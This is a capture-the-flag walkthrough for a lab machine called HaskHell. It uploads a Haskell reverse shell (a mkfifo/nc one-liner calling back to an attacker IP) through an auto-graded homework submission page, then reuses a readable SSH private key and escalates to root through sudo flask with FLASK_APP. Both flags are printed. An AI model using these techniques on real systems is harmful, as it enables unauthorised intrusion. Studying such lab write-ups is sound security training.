# HaskHell

## Description

Teach your CS professor that his PhD isn't in security.

Show your professor that his PhD isn't in security.

Please send comments/concerns/hatemail to @passthehashbrwn on Twitter.

## Initial Scan

Let's start with a full port Nmap scan. The scan reveals two open ports:
* 22 ssh
* 5001 http

~~~
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 1d:f3:53:f7:6d:5b:a1:d4:84:51:0d:dd:66:40:4d:90 (RSA)
|   256 26:7c:bd:33:8f:bf:09:ac:9e:e3:d3:0a:c3:34:bc:14 (ECDSA)
|_  256 d5:fb:55:a0:fd:e8:e1:ab:9e:46:af:b8:71:90:00:26 (ED25519)
5001/tcp open  http    Gunicorn 19.7.1
|_http-title: Homepage
|_http-server-header: gunicorn/19.7.1
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
~~~

## Webpage (port 5001)

I started with enumerating the webpage. The whole purpose of the web service is to let the students uplaod their homeworks. I found a directory named `/homework1` which is the homework that the students should do. I also found `/upload` which is where the homeworks should be uplaoded, but it doesn't work and returns error 404.

I decided to run `dirsearch` on the webpage to find more directories to work with:

~~~
┌──(user㉿Y0B01)-[~/Desktop/walkthroughs/thm/HaskHell]
└─$ dirsearch -u http://$IP:5001/ -w /usr/share/dirb/wordlists/common.txt                    

  _|. _ _  _  _  _ _|_    v0.4.1
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 30 | Wordlist size: 4613

Output File: /home/user/.dirsearch/reports/10.10.84.36/_21-11-20_03-07-09.txt

Error Log: /home/user/.dirsearch/logs/errors-21-11-20_03-07-09.log

Target: http://10.10.84.36:5001/

[03:07:09] Starting: 
[03:08:03] 200 -  237B  - /submit

Task Completed
~~~

We found a directory named `/submit` which is where we can upload files:

<p align="center"><img src="./files/submit.png"></p>

## Reverse shell

If you read the instructions in the main page for the students, we know that the files that we upload, are automaticly run by server to be graded. It means that we can upload a reverse shell in haskell language and when the server runs it, we get a shell.

I searched a bit and found the right way to execute commands on the server in haskell language. Change the IP and save the following code in a file:

~~~hs
import System.Process
main = callCommand "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <YOUR IP> 4444 >/tmp/f"
~~~

Open a listener (`rlwrap nc -lvnp 4444`) and upload the file and after a few seconds, we get a shell as user `flask`. The first thing I did was spawning a TTY shell using a python one-liner:

~~~
┌──(user㉿Y0B01)-[~/…/walkthroughs/thm/HaskHell/files]
└─$ rlwrap nc -lvnp 4444
listening on [any] 4444 ...
connect to [10.9.1.83] from (UNKNOWN) [10.10.84.36] 35086
/bin/sh: 0: can't access tty; job control turned off
$ id
uid=1001(flask) gid=1001(flask) groups=1001(flask)
$ which python
/usr/bin/python
$ python -c "import pty;pty.spawn('/bin/bash')"
flask@haskhell:~$
~~~

## User flag

I started enumerating the machine manually. If you list `/home`, we can see three users on the machine: `flask`, `haskell`, and `prof`:

~~~
flask@haskhell:~$ ls /home
flask  haskell  prof
~~~

I found the user flag in `prof`'s home directory:

~~~
flask@haskhell:~$ cd /home/prof
flask@haskhell:/home/prof$ ls
__pycache__  user.txt
flask@haskhell:/home/prof$ cat user.txt
flag{academic_dishonesty}
~~~

user.txt: `flag{academic_dishonesty}`

## flask -> prof (lateral move)

Now me need to move lateraly for more access. There is a `/.ssh` directory in `prof`'s home directory:

~~~
flask@haskhell:/home/prof$ ls -la .ssh
total 20
drwxr-xr-x 2 prof prof 4096 May 27  2020 .
drwxr-xr-x 7 prof prof 4096 May 27  2020 ..
-rw-rw-r-- 1 prof prof  395 May 27  2020 authorized_keys
-rw-r--r-- 1 prof prof 1679 May 27  2020 id_rsa
-rw-r--r-- 1 prof prof  395 May 27  2020 id_rsa.pub
~~~

Great! There is an `id_rsa` and we can use it to connect to machine via ssh as `prof`. Copy it to your machine and set its permission to 600 and now we can use it to connect to the target machine via ssh as user `prof`. The first thing I did was spawning a TTY shell, again:

~~~
┌──(user㉿Y0B01)-[~/…/walkthroughs/thm/HaskHell/files]
└─$ chmod 600 prof_rsa                                           
                                                                                                                      
┌──(user㉿Y0B01)-[~/…/walkthroughs/thm/HaskHell/files]
└─$ ssh -i prof_rsa prof@$IP
Welcome to Ubuntu 18.04.4 LTS (GNU/Linux 4.15.0-101-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Sat Nov 20 10:04:41 UTC 2021

  System load:  0.04               Processes:           108
  Usage of /:   26.3% of 19.56GB   Users logged in:     0
  Memory usage: 50%                IP address for eth0: 10.10.84.36
  Swap usage:   0%


39 packages can be updated.
0 updates are security updates.


Last login: Sat Nov 20 10:03:54 2021 from 10.9.1.83
$ id
uid=1002(prof) gid=1002(prof) groups=1002(prof)
$ python -c "import pty;pty.spawn('/bin/bash')"
prof@haskhell:~$
~~~

## Going root

Now we need to escalate our privilege. First I ran `sudo -l` to check my sudo permissions:

~~~
prof@haskhell:~$ sudo -l
Matching Defaults entries for prof on haskhell:
    env_reset, env_keep+=FLASK_APP, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User prof may run the following commands on haskhell:
    (root) NOPASSWD: /usr/bin/flask run
~~~

As you can see, we can run a script (`/usr/bin/flask`) as `root` with sudo and no password. Let's see what it does:

~~~py
#!/usr/bin/python3
# EASY-INSTALL-ENTRY-SCRIPT: 'Flask==0.12.2','console_scripts','flask'
__requires__ = 'Flask==0.12.2'
import re
import sys
from pkg_resources import load_entry_point

if __name__ == '__main__':
    sys.argv[0] = re.sub(r'(-script\.pyw?|\.exe)?$', '', sys.argv[0])
    sys.exit(
        load_entry_point('Flask==0.12.2', 'console_scripts', 'flask')()
    )
~~~

What we are looking at, is a python3 script that executes [flask](https://flask.palletsprojects.com/en/2.0.x/). When we run it, we are guided with an example usage. We can execute a python script which is passed as an environment variable to Flask:

~~~
prof@haskhell:~$ python3 /usr/bin/flask
Usage: flask [OPTIONS] COMMAND [ARGS]...

  This shell command acts as general utility
  script for Flask applications.

  It loads the application configured (through
  the FLASK_APP environment variable) and then
  provides commands either provided by the
  application or Flask itself.

  The most useful commands are the "run" and
  "shell" command.

  Example usage:

    $ export FLASK_APP=hello.py
    $ export FLASK_DEBUG=1
    $ flask run

Options:
  --version  Show the flask version
  --help     Show this message and exit.

Commands:
  run    Runs a development server.
  shell  Runs a shell in the app context.
~~~

We can write a simple python code, same as the one we used to spawn a TTY shell, and execute it with sudo, which spawns us a root shell:

~~~
prof@haskhell:~$ cat > rshell.py << EOF
> #!/usr/bin/env python3
> import pty
> pty.spawn('/bin/bash')
> EOF
prof@haskhell:~$ export FLASK_APP=rshell.py
prof@haskhell:~$ sudo /usr/bin/flask run
root@haskhell:~# id
uid=0(root) gid=0(root) groups=0(root)
~~~

## Root flag

Now that we have root access, we can head to `/root` and read the root flag:

~~~
root@haskhell:~# cd /root
root@haskhell:/root# ls
root.txt
root@haskhell:/root# cat root.txt
flag{im_purely_functional}
~~~

root.txt: `flag{im_purely_functional}`

# D0N3! ; )

Thanks to the creator(s)!

Hope you had fun and learned something.

Have a g00d one! : )